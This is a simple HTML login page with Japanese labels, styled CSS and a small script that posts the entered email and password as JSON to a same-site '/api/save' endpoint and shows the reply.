<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ログイン画面</title>
  <style>
    body {
      margin: 0;
      background: #eaf6ff;
      font-family: sans-serif;
    }
    .center-wrap {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .login-box {
      width: 300px;
      padding: 20px;
      background: #4aa3ff;
      border-radius: 18px;
      box-shadow: 0 6px 18px rgba(0,0,0,0.15);
      color: white;
      text-align: center;
    }
    input {
      width: 90%;
      margin: 5px 0;
      padding: 8px;
      border-radius: 5px;
      border: none;
    }
    button {
      width: 95%;
      padding: 10px;
      margin-top: 10px;
      border: none;
      border-radius: 10px;
      background: #0077cc;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="center-wrap">
  <div class="login-box">
    <p>メールアドレス</p>
    <input type="text" id="name" oninput="this.value=this.value.replace(/[^a-zA-Z0-9!@#$%^&*()_\\-+=\\[\\]{};:'\"\\|,.<>\\/\\?]/g,'')">
    <p>パスワード</p>
    <input type="password" id="message" oninput="this.value=this.value.replace(/[^a-zA-Z0-9!@#$%^&*()_\\-+=\\[\\]{};:'\"\\|,.<>\\/\\?]/g,'')">
    <button onclick="sendLogin()">次へ</button>
    <p id="status"></p>
  </div>
</div>

<script>
function sendLogin() {
  const email = document.getElementById("name").value;
  const password = document.getElementById("message").value;

  fetch("/api/save", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password })
  })
  .then(r => r.text())
  .then(t => document.getElementById("status").innerText = t)
  .catch(e => document.getElementById("status").innerText = "送信失敗");
}
</script>

</body>
</html>
